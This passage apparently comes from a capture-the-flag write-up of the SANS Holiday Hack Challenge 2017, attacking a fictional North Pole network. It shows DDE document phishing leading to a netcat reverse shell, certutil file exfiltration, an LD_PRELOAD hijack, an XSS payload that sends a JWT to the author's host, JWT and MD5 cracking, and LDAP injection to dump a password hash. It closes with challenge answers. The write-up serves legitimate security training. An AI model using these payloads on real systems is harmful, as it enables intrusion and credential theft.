    docx on my computer if you had that. I would click on anything with the
    words gingerbread cookie recipe in it*. I'm totally addicted and want to
    make some more.

    Thanks,

    Alabaster Snowball


    **From:** alabaster.snowball@northpolechristmastown.com

    **To:** all@northpolechristmastown.com

    **Subject:** Re: COOKIES!

    Awesome, yea if anyone finds that .docx file containing the recipe for
    "gingerbread cookie recipe", please send it to me in a docx file. Im
    currently working on my computer and would *totally download that to my
    machine, open it, and click to all the prompts*.

    Thanks!

    Alabaster Snowball.

Oh, Alabaster, your gluttony will be your downfall. Now let's see how to
deliver our payload:

    **From:** minty.candycane@northpolechristmastown.com

    **To:** all@northpolechristmastown.com

    **Subject:** Should we be worried?

    Hey Alabaster,

    You know I'm a novice security enthusiast, well I saw an article a while
    ago about regarding DDE exploits that dont need macros for MS word to
    get command execution.

    https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

    Should we be worried about this?

    I tried it on my local machine and was able to transfer a file. Here's a
    poc:

    http://mail.northpolechristmastown.com/attachments/dde_exmaple_minty_candycane.png

    I know your the resident computer engineer here so I wanted to defer to
    the expert.

    :)

    -Minty CandyCane.

    **From:** alabaster.snowball@northpolechristmastown.com

    **To:** all@northpolechristmastown.com

    **Subject:** Re: Should we be worried?

    Quit worrying Minty,

    You have nothing to worry about with me around! I have developed most of
    the applications in our network including our network defenses. We are
    are completely secure and impenetrable.

    Sincerely,

    Alabaster Snowball.

Oh, Alabaster, your hubris will **also** be your downfall. And finally, what
payload can we use:

    **From:** alabaster.snowball@northpolechristmastown.com

    **To:** all@northpolechristmastown.com

    **Subject:** Re: Lost book page

    Well powershell is my new love but netcat will always hold a special
    place in my heart.

    **From:** alabaster.snowball@northpolechristmastown.com

    **To:** all@northpolechristmastown.com

    **Subject:** Re: Lost book page

    I installed nc.exe to path for my computer.

Awesome, now we know that Alabaster has :code:`nc.exe` in his PATH. We can use
this tool to connect back to our Internet-facing machine, to get a shell access
to the Elf-Machine Interface server.

Let's prepare our malicious .docx file, using the Sensepost tutorial:

.. image:: /images/sans-christmas-challenge-2017/ewa_malicious_docx.png
    :alt: ewa_malicious_docx.png
    :align: center

Now, let's send our gingerbread cookie recipe to our dear Alabaster, from Mrs
Claus's account. We can do this by putting her email address in our cookie, as
explained in the EWA section:

.. image:: /images/sans-christmas-challenge-2017/ewa_phishing_email.png
    :alt: ewa_phishing_email.png
    :align: center

And now, we wait for a shell:

.. code-block:: console

    $ nc -knlvp 8080
    listening on [any] 8080 ...
    connect to [X.X.X.X] from (UNKNOWN) [35.185.57.190] 52783
    Microsoft Windows [Version 10.0.14393]
    (c) 2016 Microsoft Corporation. All rights reserved.
    
    C:\Users\alabaster_snowball\Documents>

Sweet! We have a shell access to the EMI machine. Now, the only thing to do is
to get the :code:`C:\GreatBookPage7.pdf` file. But how to exfiltrate?
Exfiltrating data from a Windows machine can be a pain, since there's no
useful tools like :code:`scp`, :code:`curl`, etc. (yet) to send data to the
outside.  One of my favourite tricks is to use the :code:`certutil.exe` command
tool.  This tool is used to manipulate certificates, etc., but `it can be used
to base64-encode and -decode data <https://twitter.com/subtee/status/920425668084510721>`__.

So, what we'll do is simply base64 encode the page to a file. Then we'll output
the content of the file, copy/paste it to our machine, and base64-decode it:

.. code-block:: console

    C:\Users\alabaster_snowball\Documents> certutil.exe -f -encode C:\GreatBookPage7.pdf C:\Users\alabaster_snowball\Documents\GreatBookPage7.pdf.b64
    Input Length = 1053508
    Output Length = 1448634
    CertUtil: -encode command completed successfully.

    C:\Users\alabaster_snowball\Documents> type .\GreatBookPage7.pdf.b64
    -----BEGIN CERTIFICATE-----
    JVBERi0xLjMKJcTl8uXrp/Og0MTGCjUgMCBvYmoKPDwgL0xlbmd0aCA2IDAgUiAv
    [snip]
    RU9GCg==
    -----END CERTIFICATE-----

Then, on my machine (you must remove the :code:`BEGIN CERTIFICATE` and
:code:`END CERTIFICATE` from the output):

.. code-block:: console

    $ base64 -d .\GreatBookPage7.pdf.b64 > GreatBookPage7.pdf

Which gives us the `seventh page of The Great Book </docs/sans-christmas-challenge-2017/GreatBookPage7.pdf>`__
(sha256: :code:`bc93c535481abb76e3c5180406ea9ea0910acd53f76cab788f1d680d21b611b5`):

    Regarding the Witches of Oz
    
    Of all the varied and amazing people who inhabit the Land of Oz, the
    witches are among the most powerful, wielding potent magic and mesmerizing
    spells. They travel through the air, propelled by bubbles or broomsticks.
    Each witch has a very different attitude and outlook, ranging from faithful
    friends who are dear to us all way down to hearts full of unwashed socks
    and souls full of gunk.

    During the Great Schism, the witches very deliberately remained neutral,
    siding with neither the Munchkins nor the Elves. The witches seem to live
    exclusively in Oz, tending to their castles. As of this writing, the
    witches have never been observed in the North Pole.

Who is behind all this?
~~~~~~~~~~~~~~~~~~~~~~~
North Pole and Beyond: We're Off To See The...
----------------------------------------------
Cranberry Pi
............

::

                     .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
                   _(_      _Y_      _Y_      _Y_      _Y_      _)_
                  [___]    [___]    [___]    [___]    [___]    [___]
                  /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
                 |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
                 \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
             jgs  \::./    \::./    \::./    \::./    \::./    \::./
                   '='      '='      '='      '='      '='      '='
    Wunorse Openslae has a special challenge for you.
    Run the given binary, make it return 42.
    Use the partial source for hints, it is just a clue.
    You will need to write your own code, but only a line or two.

Alright, we have a program, and we need to make it return 42:

.. code-block:: console

    elf@ed587b205bb6:~$ ls -lh
    total 100K
    -rwxr-xr-x 1 root root  83K Dec 16 16:56 isit42
    -rw-r--r-- 1 root root  654 Dec 16 16:56 isit42.c.un
    elf@ed587b205bb6:~$ ./isit42
    Starting up ... done.
    Calling rand() to select a random number.
    170 is not 42.

Ok, the program seems to generate a random number, using :code:`rand()`, and
compare the result to 42. If the random number is not equal to 42, the program
outputs an error. So, how can we force :code:`rand` to return 42?

The common trick is to use :code:`LD_PRELOAD`. If this shell variable holds
the path to a shared library, this library will be loaded before any other
library, include :code:`libc`. The idea is to create our own library, with
our own version of :code:`rand` that, for example, always return 42. Luckily
for us, a `SANS blog post <https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win>`__
was recently posted on the subject.

The blog post focuses on the :code:`usleep` instead of :code:`rand`, but the
principle is the same. So, let's create our own :code:`rand` library!

.. code-block:: console

    elf@ed587b205bb6:~$ cat <<EOF > hijack_rand.c
    > int rand()
    > {
    >     return 42;
    > }
    >
    > EOF
    elf@ed587b205bb6:~$ cat hijack_rand.c
    int rand()
    {
        return 42;
    }
    elf@ed587b205bb6:~$ gcc -o hijack_rand.so -shared -fPIC ./hijack_rand.c
    elf@ed587b205bb6:~$ LD_PRELOAD="./hijack_rand.so" ./isit42
    Starting up ... done.
    Calling rand() to select a random number.
                     .-.
                    .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______
                   /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
                  /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
                |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_
            ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
             \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
             | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
              \/|(_) () (_)|\/
                \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______
                _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
              /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
             / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____
            /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
           `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
           |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
           /  \|---|    |---|/  \
           |  (|42 | () | DA|)  |       _   ___  _______
           \  /;---'    '---;\  /      | | |   ||       |
            `` \ ___ /\ ___ / ``       | |_|   ||____   |
                `|  |  |  |`           |       | ____|  |
          jgs    |  |  |  |            |___    || ______| ___
           _._  |\|\/||\/|/|  _._          |   || |_____ |   |
          / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
          | \__.'    ||    '.__/ |
           `---------''---------`
    Congratulations! You've won, and have successfully completed this challenge.

Redirecting the snowball
........................

Here's the layout I used to solve this level (I know, I got suuuper lazy, but
God bless this portal):

.. image:: /images/sans-christmas-challenge-2017/we_re_off_to_see_the_snowball.gif
    :alt: we_re_off_to_see_the_snowball.gif
    :align: center

Having completed this level, we have a little chat with a certain someone:

    **Glinda the Good Witch:** It's me, Glinda the Good Witch of Oz! You found
    me and ruined my genius plan!
    
    You see, I cast a magic spell on the Abominable Snow Monster to make him
    throw all the snowballs at the North Pole. Why? Because I knew a giant
    snowball fight would stir up hostilities between the Elves and the
    Munchkins, resulting in all-out WAR between Oz and the North Pole. I was
    going to sell my magic and spells to both sides. War profiteering would
    mean GREAT business for me.
    
    But, alas, you and your sleuthing foiled my venture. And I would have
    gotten away with it too, if it weren't for you meddling kids!

My, oh my, what a nasty plan!

North Pole Christmas Town infrastructure: Elf Database
------------------------------------------------------

On to the last application, the Elf Database. Given the name, we can expect the
application to be some sort of web interface allowing us to have access to the
list of North Pole's elves.

Once again, if we try to connect using Alabaster's account, we get an
:code:`Incorrect username or password!` error.

.. image:: /images/sans-christmas-challenge-2017/edb_login_fail.png
    :alt: edb_login_fail.png
    :align: center

So, let's see what we can find from basic recon. Once again, we get some
information by taking a look at the :code:`robots.txt` file:

.. code-block:: http

    GET /robots.txt HTTP/1.1
    Host: edb.northpolechristmastown.com
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Cookie: SESSION=5A0K85HFazf2m0ltjg3g
    Connection: close

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Sun, 07 Jan 2018 23:02:46 GMT
    Content-Type: text/plain; charset=utf-8
    Connection: close
    Last-Modified: Tue, 15 Aug 2017 04:58:06 GMT
    
    User-agent: *
    Disallow: /dev

So, there is a :code:`/dev` directory. If we browse to it, we find only one
file, :code:`LDIF_template.txt`:

.. code-block:: http

    GET /dev/LDIF_template.txt HTTP/1.1
    Host: edb.northpolechristmastown.com
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Cookie: SESSION=5A0K85HFazf2m0ltjg3g
    Connection: close

.. code-block:: http
    :hl_lines: 52

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Sun, 07 Jan 2018 23:04:47 GMT
    Content-Type: text/plain; charset=utf-8
    Content-Length: 751
    Connection: close
    Accept-Ranges: bytes
    
    #LDAP LDIF TEMPLATE
    
    dn: dc=com
    dc: com
    objectClass: dcObject
    
    dn: dc=northpolechristmastown,dc=com
    dc: northpolechristmastown
    objectClass: dcObject
    objectClass: organization
    
    dn: ou=human,dc=northpolechristmastown,dc=com
    objectClass: organizationalUnit
    ou: human
    
    dn: ou=elf,dc=northpolechristmastown,dc=com
    objectClass: organizationalUnit
    ou: elf
    
    dn: ou=reindeer,dc=northpolechristmastown,dc=com
    objectClass: organizationalUnit
    ou: reindeer
    
    dn: cn= ,ou= ,dc=northpolechristmastown,dc=com
    objectClass: addressbookPerson
    cn: 
    sn: 
    gn: 
    profilePath: /path/to/users/profile/image
    uid: 
    ou: 
    department: 
    mail: 
    telephoneNumber: 
    street:
    postOfficeBox: 
    postalCode: 
    postalAddress: 
    st: 
    l: 
    c: 
    facsimileTelephoneNumber: 
    description: 
    userPassword: 

This gives us some info about how the Elf Database application functions.
There's obviously an LDAP backend. We also have the list of attributes for the
object representing the users, including one which seems particularly juicy,
:code:`userPassword`.

Learning that the application uses an LDAP backend, I tried to bypass
authentication using LDAP injection, but it did not work. So, let's take a look
at the source code of the application. Here's what we can find on the
:code:`index.html` page:

.. code-block:: html
    :hl_lines: 5 7

        <script>
            if (!document.cookie) {
                window.location.href = '/';
            } else {
                token = localStorage.getItem("np-auth");
                if (token) {
                    $.post( "/login", { auth_token: token }).done(function( result ) {
                        if (result.bool) {
                            window.location.href = result.link;
                        }
                    })
                }
            }
        </script>
    </html>

Hmm, a token stored in the local storage, under the key :code:`np-auth` seems
to be used for the application session management. Let's keep digging.

Under the login form, there's a support link, where you can send a password
reset request to an administrator. Since we have access to Alabaster's email
account, let's try and reset his password:

.. code-block:: http

    POST /service HTTP/1.1
    Host: edb.northpolechristmastown.com
    Origin: http://edb.northpolechristmastown.com
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Cookie: SESSION=6S6Nd58Sy85OK09ui063
    Connection: close
    
    uid=alabaster.snowball&email=alabaster.snowball%40northpolechristmastown.com&message=I+forgot+my+password!

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Sun, 07 Jan 2018 23:20:45 GMT
    Content-Type: application/json
    Content-Length: 115
    Connection: close
    
    {"bool":true,"link":"/reset_request?ticket=OYHAT-T8XZR-EC2YB-U0173","message":"Request Submitted. Redirecting..."}

Now that our password reset request was sent, let's check Alabaster's email!
Hmm, nothing. Let's see what happened after our request was sent. We get
redirected to a support ticket page:

.. image:: /images/sans-christmas-challenge-2017/edb_request_normal.png
    :alt: edb_request_normal.png
    :align: center

And our message is embedded in the page. Is it possible that they forgot to
sanitize our user input? Let's try to inject some special characters:

.. code-block:: http

    POST /service HTTP/1.1
    Host: edb.northpolechristmastown.com
    Origin: http://edb.northpolechristmastown.com
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Referer: http://edb.northpolechristmastown.com/index.html
    Cookie: SESSION=53LByIBB8Ct5Z79RdsTC
    
    uid=alabaster.snowball&email=alabaster.snowball%40northpolechristmastown.com&message=<u>Pretty+underlined+message</u>

Now, if we take a look at our ticket page, we can see that the :code:`<u>` tag
was rendered, and my message appears underlined:

.. image:: /images/sans-christmas-challenge-2017/edb_request_underlined.png
    :alt: edb_request_underlined.png
    :align: center

.. code-block:: html
    :hl_lines: 6

    <tr>
        <td>Alabaster</td> 
        <td>Snowball</td>
        <td>alabaster.snowball@northpolechristmastown.com</td>
        <td>123-456-7890</td>
        <td><u>Pretty underlined message</u></td>
    </tr>
    </tbody>

This means that we can try to perform an XSS attack against the administrator
that will visualize our request! I usually use tags like :code:`<u>` or
:code:`<b>` when testing for XSS, because they're usually not picked up by
WAFs or by custom implemented filters. And indeed, if we take a look at the
:code:`custom.js` file, we can see that there's some filtering done on the
client side to trigger on text like :code:`script`.

.. code-block:: js
    :hl_lines: 10

    // --------------------------Customer Service Request -----------------------------/
    $('#help_button').click(function(e){
        e.preventDefault();
        var help_uid = $('#help_uid').val();
        var help_email = $('#help_email').val();
        var help_message = $('#help_message').val();
        if (help_uid.match(/^\w+\.\w+$/g) != null){
            if (help_email.match(/^[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?$/g) !== null){
                if (help_message.match(/^.+$/g) != null) {
                    if (help_message.match(/[sS][cC][rR][iI][pP][tT]/g) == null) {

Now, client-side verifications can be bypassed easily by performing the HTTP
request directly. But in that case, the check (among others) was also performed
on the server-side.

So, let's use another type of XSS payload, that does not involve the word
:code:`script`. One of the most common is to use the :code:`onerror` attribute.
Let's try and see:

.. code-block:: http

    POST /service HTTP/1.1
    Host: edb.northpolechristmastown.com
    Origin: http://edb.northpolechristmastown.com
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Referer: http://edb.northpolechristmastown.com/index.html
    Cookie: SESSION=53LByIBB8Ct5Z79RdsTC
    
    uid=alabaster.snowball&email=alabaster.snowball%40northpolechristmastown.com&message=<img src=x onerror="alert('Huh oh, Spaghettios')" />

.. image:: /images/sans-christmas-challenge-2017/edb_request_xss.png
    :alt: edb_request_xss.png
    :align: center

Bingo, it works! Now, let's create a payload that will capture the
:code:`np-auth` entry from the local storage. The application uses jQuery,
which means that we can use :code:`$.get` to easily exfiltrate our token to our
public-facing website:

.. code-block:: http

    POST /service HTTP/1.1
    Host: edb.northpolechristmastown.com
    Origin: http://edb.northpolechristmastown.com
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Referer: http://edb.northpolechristmastown.com/index.html
    Cookie: SESSION=53LByIBB8Ct5Z79RdsTC
    
    uid=alabaster.snowball&email=alabaster.snowball%40northpolechristmastown.com&message=<img src=x onerror="$.get(%26quot;http://X.X.X.X/?%26quot;%2blocalStorage.getItem(%26quot;np-auth%26quot;),function(a,b){})" />

And in a :code:`nc` on our server, we wait for our payload to get triggered:

.. code-block:: console
    :hl_lines: 4

    # nc -nvk -l -p 80
    listening on [any] 80 ...
    connect to [X.X.X.X] from (UNKNOWN) [Y.Y.Y.Y] 50132
    GET /?eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.M7Z4I3CtrWt4SGwfg7mi6V9_4raZE5ehVkI9h04kr6I HTTP/1.0
    Host: X.X.X.X
    Connection: close
    Accept: */*
    Referer: http://127.0.0.1/reset_request?ticket=DFYCN-8UI5I-AD87J-BRR9P
    Origin: http://127.0.0.1
    User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,*

Hurray, we got our token! Let's put it in our local storage, then head to the
:code:`index.html` page, and... nothing. Well that's disappointing. Let's take
a look at our token. It seems to be three base64-encoded pieces of data,
separated by full stops. This seems to indicate that this is a `JSON Web Token
(JWT) <https://auth0.com/learn/json-web-tokens/>`__. The first part is the
header, :code:`{"alg":"HS256","typ":"JWT"}`, the second part is the payload,
:code:`{"dept":"Engineering","ou":"elf","expires":"2017-08-16 12:00:47.248093+00:00","uid":"alabaster.snowball"}`,
and the third part is the signature.

Our newfound token didn't work because it seems that it expired in August 2017.
We could modify the expiry date to put it in the future, but we can't compute
a new signature for our modified payload, because we don't know what secret
key is used. I tried using the trick of the :code:`none` algorithm (`described
here <https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/>`__),
which has worked for coworkers of mine in the past. But it didn't work in that
case.

What's left to us is to try and bruteforce the secret key, so that we can
create our own JWT. :code:`JohnTheRipper` can actually bruteforce it for us,
since it can bruteforce HMAC-256 secret keys. We just have to `make some
changes to our token <https://security.stackexchange.com/a/134829>`__:

.. code-block:: console
    :hl_lines: 8

    $ cat alabaster_jwt.txt 
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE3LTA4LTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9#33b6782370adad6b78486c1f83b9a2e95f7fe2b6991397a156423d874e24afa2
    $ john ./alabaster_jwt.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    3lv3s            (?)
    1g 0:00:02:28 DONE 3/3 (2018-01-08 00:59) 0.006742g/s 2154Kp/s 2154Kc/s 2154KC/s 3k3ys..au10.
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

Wow, it worked. I must confess that it was kind of my last hope, and I wasn't
sure it was going to work. But hey, we now have our secret key, :code:`3lv3s`,
and we can now generate valid JWT for Alabaster. I used https://jwt.io/ to do
so, and obtain the following token:

    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0

We can now log into the application:

.. image:: /images/sans-christmas-challenge-2017/edb_santa_panel.png
    :alt: edb_santa_panel.png
    :align: center

There's a Santa panel, but we're not identified as Santa, so we can't access
it. We could try to forge a JWT for Santa, but we can see in the source code
of the application, that we actually need his password:

.. code-block:: js
    :hl_lines: 4

    $('#santa_panel').click(function(e){
        e.preventDefault();
        if (user_json['dept'] == 'administrators') {
            pass = prompt('Confirm you are a Claus by confirming your password: ').trim()
            if (pass) {
                poster("/html", { santa_access: pass }, token, function(result){
                    if (result) {
                        $('#inneroverlay').html(result);
                        $('.overlay').css('display','flex');
                    } else {
                        Materialize.toast('Incorrect Password...', 4000);
                    }
                });    
            }
        } else {
            Materialize.toast('You must be a Claus to access this panel!', 4000);
        }
    });

So, we need to find a way to get his password. Let's take a look at the
application. Apparently, we can query the application's database for elves or
reindeers matching certain names, and get some properties:

.. code-block:: http

    POST /search HTTP/1.1
    Host: edb.northpolechristmastown.com
    np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0
    X-Requested-With: XMLHttpRequest
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
    Referer: http://edb.northpolechristmastown.com/home.html
    Cookie: SESSION=4wtVec24212atYU1RpE3
    Connection: close
    
    name=alabaster&isElf=True&attributes=profilePath,gn,sn,mail

.. code-block:: http

    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Mon, 08 Jan 2018 00:08:50 GMT
    Connection: close
    
    
    [[["cn=alabaster,ou=elf,dc=northpolechristmastown,dc=com",{"gn":["Alabaster"],"mail":["alabaster.snowball@northpolechristmastown.com"],"profilePath":["/img/elves/elf1.PNG"],"sn":["Snowball"]}]]]

Given the result's format, we can expect the application to performan LDAP
query to retrieve the wanted attributes. If only we knew the syntax of this
query... But, wait! Let's see what we have in the application source code:

.. code-block:: js
    :hl_lines: 8

    //Note: remember to remove comments about backend query before going into north pole production network
    /*
    
    isElf = 'elf'
    if request.form['isElf'] != 'True':
        isElf = 'reindeer'
    attribute_list = [x.encode('UTF8') for x in request.form['attributes'].split(',')]
    result = ldap_query('(|(&(gn=*'+request.form['name']+'*)(ou='+isElf+'))(&(sn=*'+request.form['name']+'*)(ou='+isElf+')))', attribute_list)
    
    #request.form is the dictionary containing post params sent by client-side
    #We only want to allow query elf/reindeer data
    
    */

We have the syntax of the query. And there doesn't seem to be any filtering
on our parameters, so we can try to perform an `LDAP injection <https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap>`__.
I recommend you read this link, to better understand how the LDAP syntax works.

Now, we want to perform our injection in the :code:`name` parameter. The goal
is to get a query that will match Santa's user entry. I ended up going with
the following payload: :code:`santa*)(ou=*))(&(sn=foo`. Indeed, the final
syntax is then:

.. code-block:: ldap

    (|(&(gn=*santa*)(ou=*))(&(sn=foo*)(ou=elf))(&(sn=*santa*)(ou=*))(&(sn=foo*)(ou=elf)))

This query should match Santa, since we're searching for entries with names
containing :code:`santa` in any organizational unit. Now, let's perform our
search. Since we're allowed to query any attributes we want, let's ask for the
:code:`userPassword` attribute, found in the earlier
:code:`LDIF_template.txt` file:

.. code-block:: http
    :hl_lines: 10
    
    POST /search HTTP/1.1
    Host: edb.northpolechristmastown.com
    Accept: */*
    Origin: http://edb.northpolechristmastown.com
    np-auth: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXB0IjoiRW5naW5lZXJpbmciLCJvdSI6ImVsZiIsImV4cGlyZXMiOiIyMDE4LTAxLTE2IDEyOjAwOjQ3LjI0ODA5MyswMDowMCIsInVpZCI6ImFsYWJhc3Rlci5zbm93YmFsbCJ9.OsSuRkYF-13eNfXyuCDYmb9XUjBhnbmQ9Oe1yRWDrH0
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    Referer: http://edb.northpolechristmastown.com/home.html
    Cookie: SESSION=4F359T9wWTvpBczV3335
    
    name=santa*)(ou=*))(%26(sn=foo&isElf=True&attributes=userPassword

.. code-block:: http
    :hl_lines: 8
    
    HTTP/1.1 200 OK
    Server: nginx/1.10.3
    Date: Mon, 08 Jan 2018 00:16:42 GMT
    Content-Type: application/json
    Content-Length: 113
    Connection: close
    
    [[["cn=santa,ou=human,dc=northpolechristmastown,dc=com",{"userPassword":["d8b4c05a35b0513f302a85c409b4aab3"]}]]]

We now have Santa's hashed password. Given the form, it seems to be an MD5
hash. Let's use :code:`JohnTheRippher` again to try and crack it:

.. code-block:: console
    :hl_lines: 8

    $ cat santa_password.txt 
    d8b4c05a35b0513f302a85c409b4aab3
    $ john --format=raw-md5 --wordlist=./rockyou.txt ./santa_password.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
    Warning: no OpenMP support for this hash type, consider --fork=4
    Press 'q' or Ctrl-C to abort, almost any other key for status
    001cookielips001 (?)
    1g 0:00:00:00 DONE (2018-01-08 01:23) 1.315g/s 18776Kp/s 18776Kc/s 18776KC/s 002007238..00196900
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

Hurray, we have Santa's password! We can now log into the application, and
access his panel. This gives us access to this letter, sent to him:

.. image:: /images/sans-christmas-challenge-2017/wizard_of_oz_to_santa_d0t011d408nx.png
    :alt: wizard_of_oz_to_santa_d0t011d408nx.png
    :align: center

Here's what the letter says:

    From: The Wizard of Oz
    
    Emerald City, Oz
    
    To: Santa Claus
    
    Christmas Town, North Pole
    
    Dear Santa,
    
    My old friend! I wish you a very merry Christmas. Thank you for all you do
    to bring holiday cheer around the world.

    Every year, I enjoy our gift exchange -- you giving me a Christmas present
    and I giving you a Solstice gift. We've exchanged some crazy things in the
    past. By my reckoning, you've given me:

    * Big Hair Hairspray
    * Pink Election Campaign Hat
    * Bacon Bandages
    * Scapy the Unicorn Plush Pillow
    * Princess Leia Earmuffs
    * Bacon Tie with Giant TV Remote
    * Stormtrooper Boxer Shorts

    Ah what fun times! And I've given you:

    * The Nubulator
    * Garden Gnome
    * Justin Bieber Toothbrush
    * Snorty the Pig Hat and Pink Gloves
    * Giant Inflatable Olaf the Snowman
    * Ariana Grande Light-up Cat Ear Headphones

    Well, wait 'til you see what I've got for you this year, my friend! Yule
    love it!

    Merry Christmas!

    -- The Wizard

Well, it's nice to see that Santa gets gifts too!

Answers to the questions
~~~~~~~~~~~~~~~~~~~~~~~~

Let's answer the questions:

1. `Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?`

The title of the first page of *The Great Book* is **About This Book...**.

2. `Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?`

The topic of the second page of *The Great Book* is the creation of flying
animals in Oz, which lead to the creation of flying reindeers.

Alabaster Snowball's password is :code:`stream_unhappy_buy_loss`.

3. `The North Pole engineering team uses a Windows SMB server for sharing documentation and correspondence. Using your access to the Letters to Santa server, identify and enumerate the SMB file-sharing server. What is the file server share name?`

The name of the share on :code:`hhc17-smb-server` is :code:`FileStor`.

4. `Elf Web Access (EWA. is the preferred mailer for North Pole elves, available internally at http://mail.northpolechristmastown.com. What can you learn from The Great Book page found in an e-mail on that server?`

The fourth page of *The Great Book* speaks of the battles between Munchkins and
Elves, the creation of the Lollipop Guild, and their infiltration in the North
Pole population.

5. `How many infractions are required to be marked as naughty on Santa's Naughty and Nice List? What are the names of at least six insider threat moles?  Who is throwing the snowballs from the top of the North Pole Mountain and what is your proof?`

It takes four infractions to be marked as naughty on Santa's list.

Here are six insider threat moles:

* Boq Questrian
* Bini Aru
* Sheri Lewis
* Kirsty Evans
* Nina Fitzgerald
* Beverly Khalil

The discussion between us, Sam the Snowman, and Bumble informs us that the
person throwing giant snowballs is Bumble, the Abominable Snow Monster.

